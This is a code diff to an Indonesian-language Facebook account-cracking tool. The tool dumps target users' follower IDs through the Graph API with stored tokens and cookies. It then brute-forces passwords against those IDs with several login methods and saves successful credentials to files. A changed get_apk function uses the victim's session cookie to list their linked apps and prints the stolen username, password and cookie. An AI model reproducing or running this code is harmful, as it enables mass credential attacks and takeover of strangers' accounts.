@@ -971,7 +971,7 @@ def clon_email():
 		D = f'{A}{str(rc(B))}{C}'
 		if D in dump:pass
 		else:dump.append(D+'|'+nama)
-		if len(dump)==2000:atur_atur()
+		if len(dump)==2000:setting()
 		print('\r Sedang Dump %s id'%(len(dump)),end='')
 		sys.stdout.flush()
 	setting()
@@ -1027,60 +1027,6 @@ def kocak(url,cokies):
 				kocak("https://mbasic.facebook.com"+x.get("href"),cokies)
 			
 ###----------[ DUMP PENGIKUT ]---------- ###
-def pengikut():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	ses = requests.Session()
-	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold green"))
-	akun = console.input(f' ╰─  Masukan Id Target : ')
-	try:
-		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
-		for pi in koh2['subscribers']['data']:
-			try:
-			    id.append(pi['id']+'|'+pi['name'])
-			    sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
-			    time.sleep(0.0002)
-			except:continue
-		print("\r")
-		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold yellow"))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(f" ╰─  Koneksi Internet Anda Bermasalah")
-		time.sleep(3);exit()
-	except (KeyError,IOError):
-		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
-		time.sleep(3);exit()
-		
-def pengikut1():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	ses = requests.Session()
-	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold Blue"))
-	akun = wa.input(f' [+] Masukan Id Target : ')
-	try:
-		koh2 = ses.get(f'https://graph.facebook.com/v15.0/{akun}?fields=subscribers.limit(999999)&access_token={token}',cookies={'cookie': cok}).json()
-		for pi in koh2['subscribers']['data']:
-			try:
-			    id.append(pi['id']+'|'+pi['name'])
-			    sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
-			    time.sleep(0.0002)
-			except:continue
-		print("\r")
-		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(f" [+] Koneksi Internet Anda Bermasalah")
-		time.sleep(3);exit()
-	except (KeyError,IOError):
-		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
-		time.sleep(3);exit()
-
 
 def pengikut2():
 	try:
@@ -1488,7 +1434,7 @@ def passwrd():
 				elif 'metode_api' in method:
 					pool.submit(memex,idf,pwv,awal)
 				elif 'reguler' in method:
-					pool.submit(reguler,idf,pwv)
+					pool.submit(reguler,idf,pwv,awal)
 				else:
 					pool.submit(_async,idf,pwv)
 		print('')
@@ -1505,7 +1451,7 @@ def passwrd():
 
 
 #--------------------[ METODE reguler ]-----------------#
-def reguler(idf,pwv):
+def reguler(idf,pwv,awal):
 	global loop,ok,cp
 	rr = random.randint
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
@@ -1585,7 +1531,7 @@ def reguler(idf,pwv):
 					prints(tree)
 					os.popen('play-audio o.mp3')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-					cek_apk(kuki)
+					get_apk(idf,pw,kuki)
 					break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
@@ -1683,12 +1629,12 @@ def crack1(idf,pwv,awal):
 				coki = f"sb={ssbb};{cokz}"
 				print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				oks.append(idf+'|'+pw)
+				akun.append(idf+'|'+pw)
 				break
 			elif "www.facebook.com" in xnxx["error"]["message"]:
 				print('\r\r\x1b[38;5;208m [CP] '+idf+' | '+pw+'\033[1;97m')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
-				cps.append(idf+'|'+pw)
+				akun.append(idf+'|'+pw)
 				break
 			elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:
 				prog.update(des,description=f"[bold white][[bold yellow]{ahir}[bold white]]-[[bold white]{loop}[bold yellow]/[bold white]{len(id)}[bold white]]-[[bold green]OK-:[bold green]{ok}[/] {k}CP-:[bold yellow]{cp}[bold white]][/]")
@@ -1751,72 +1697,75 @@ def memex(idf,pwv,awal):
 	loop+=1
 
 
+
+
+
+aktif = []
+kadaluwarsa = []
 ###----------[ PRINT MUNCUL APK ]---------- ###
-def get_apk(self,user,pw,cookie):
-###----------[ CEK MODE GRATIS ]---------- ###
-	try:
-		url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
-		if "Apa yang Anda pikirkan sekarang" in url:
-			pass
-		else:
-			for z in url.find_all("a",href=True):
-				if "Tidak, Terima Kasih" in z.text:
-					get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
-					parsing = parser(get.text,"html.parser")
-					action = parsing.find("form",{"method":"post"})["action"]
-					data = {
+def get_apk(idf,pw,kuki):
+    try:
+        url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": kuki}).text
+        if "Apa yang Anda pikirkan sekarang" in url:
+            pass
+        else:
+            for z in url.find_all("a",href=True):
+                if "Tidak, Terima Kasih" in z.text:
+                    get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": kuki})
+                    parsing = parser(get.text,"html.parser")
+                    action = parsing.find("form",{"method":"post"})["action"]
+                    data = {
 							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
 							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
 							"submit": "OK, Gunakan Data"
 						}
-					post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
-					break
-	except:pass
-		###----------[ APLIKASI AKTIF ]---------- ###
-	aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
-	self.apkaktif("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookie)
-	if len(self.aktif)==0:
-		aktip.add(f"{P2}tidak ada aplikasi yang terkait")
-	else:
-		for apk in self.aktif:
-			aktip.add(f"{H2}{apk}{P2}")
-		###----------[ APLIKASI KADALUWARSA ]---------- ###
-		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
-		self.apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
-		if len(self.kadaluwarsa)==0:
-			kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
-		else:
-			for apk in self.kadaluwarsa:
-				kadalu.add(f"{M2}{apk}{P2}")
-		###----------[ PRINT SEMUA ]---------- ###
-		tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-		tree.add(aktip)
-		tree.add(kadalu)
-		tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
-		prints(tree)
+                    post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": kuki})
+                    break
+    except:pass
+    
+    aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
+    apkaktif("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",kuki)
+    if len(aktif)==0:
+        aktip.add(f"{P2}tidak ada aplikasi yang terkait")
+    else:
+        for apk in aktif:
+            aktip.add(f"{H2}{apk}{P2}")
+            kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
+            apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",kuki)
+            if len(kadaluwarsa)==0:
+                kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
+            else:
+                for apk in kadaluwarsa:
+                    kadalu.add(f"{M2}{apk}{P2}")
+                    
+        tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+        tree.add(aktip)
+        tree.add(kadalu)
+        tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
+        prints(tree)
 ###----------[ GET APK AKTIF ]---------- ###
-def apkaktif(self,url,cookie):
-	try:
-		data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
-		for apk in data.find_all("h3"):
-			if "Ditambahkan" in apk.text:
-				self.aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
-			else:continue
-				next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
-			self.apkaktif(next,cookie)
-	except:pass
+def apkaktif(url,cookie):
+    try:
+        data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
+        for apk in data.find_all("h3"):
+            if "Ditambahkan" in apk.text:
+                aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
+            else:continue
+            next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
+            apkaktif(next,cookie)
+    except:pass
 		
 ###----------[ GET APK KADALUWARSA ]---------- ###
-def apkkadaluwarsa(self,url,cookie):
-	try:
-		data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
-		for apk in data.find_all("h3"):
-			if "Kedaluwarsa" in apk.text:
-				self.kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
-			else:continue
-				next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
-			self.apkkadaluwarsa(next,cookie)
-	except:pass
+def apkkadaluwarsa(url,cookie):
+    try:
+        data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
+        for apk in data.find_all("h3"):
+            if "Kedaluwarsa" in apk.text:
+                kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
+            else:continue
+            next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
+            apkkadaluwarsa(next,cookie)
+    except:pass
 	
 
 
@@ -2030,7 +1979,7 @@ def mengecek(user,pw):
 			number +=1
 			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
 	elif "login_error" in str(response):
-		oh = run.find("div",{"id":"login_error"}).find("div").text
+		oh = response.find("div",{"id":"login_error"}).find("div").text
 		print("%s %s"%(M,oh))
 	else:
 		tree = Tree(" ",guide_style=f"bold white")
